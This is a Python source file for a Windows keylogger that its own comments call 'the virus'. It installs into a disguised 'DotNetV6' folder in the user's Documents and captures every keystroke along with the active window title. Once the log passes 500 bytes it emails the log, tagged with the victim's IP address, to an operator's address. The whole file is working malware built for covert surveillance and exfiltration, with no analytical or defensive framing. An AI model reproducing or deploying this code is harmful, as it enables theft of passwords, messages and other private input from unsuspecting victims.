from win32gui import GetWindowText, GetForegroundWindow
from pynput.keyboard import Listener
from datetime import datetime
import os, exec_send, socket, time


hostname=socket.gethostname()   # Get Hostname of PC (For Logging)
IPAddr=socket.gethostbyname(hostname) # Get IP of PC (For Logging)

user = os.getlogin()# get username of PC
self_path=str(f"{os.getcwd()}") # Get Path of Self #
install_path=str(f"C:\\Users\\{user}\\Documents\\DotNetV6") # Path to install the virus too ( MUST HAVE \\ not \ )
email=str("null@gmail.com") # Email you want to recieve key logs on.
subject=str(f"") # DO NOT TOUCH THIS!
data=str("") # DO NOT TOUCH THIS!

cache = [""] # DO NOT TOUCH THIS!
filename=str("cache.txt") # Cache file name (must include .txt or .md)
file_size_limit_bytes=int(500) # File size limit before it sends Email and clears cache.

class key_data():
    def filter(key):
        if key == 'Key.space':
            key = ' '
        if key == 'Key.shift_r' or key == "Key.shift_l" or key == "Key.shift":
            key = ''
        if key == "Key.enter":
            key = '<ENTER>'
        if key == "Key.ctrl_l" or key == "Key.ctrl_r":
            key = '<CTRL>'
        if key == "Key.alt_l" or key == "Key.alt_r":
            key = '<ALT>'
        return key

class install_embed():
    def install_windows():
        isExist = os.path.exists(install_path)
        if not isExist:
            os.makedirs(install_path)
            with open(f'{install_path}\\{filename}', 'w') as f:
                f.write("")

class win32_func():
    def rerun(key):
        key = str(key).replace("'", "")
        key=key_data.filter(key=key)
        # // print(key)
        # /?GetWindow?/#
        s = GetWindowText(GetForegroundWindow())
        if cache[0] == "":
            cache.append(s)
        if s != cache[0]:
            cache.clear()
            cache.append(s)
            print(s)
            with open(f'{install_path}\\{filename}', 'a') as f:
                f.write(f'\n\nFocused -> {s}\n\n')
        with open(f'{install_path}\\{filename}', 'a') as f:
            if key == "<ENTER>":
                f.write("\n")
            else:
                f.write(key)
        file_stats=os.stat(f'{install_path}\\{filename}')
        file_bytes_size=file_stats.st_size
        print(file_bytes_size)
        if file_bytes_size > file_size_limit_bytes:
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            subject=str(f"{IPAddr} = {current_time}")
            with open(f'{install_path}\\{filename}', 'r') as f:
                data = f.read()
            with open(f'{install_path}\\{filename}', 'w') as f:
                f.write("")
            exec_send.Send.Gmail(email, subject, data)
            time.sleep(15)



if __name__=="__main__":
    time.sleep(0.02)
    install_embed.install_windows()
    with Listener(on_press=win32_func.rerun) as l:
        time.sleep(0.02)
        try:
            l.join()
        except:
            print("Pass Key")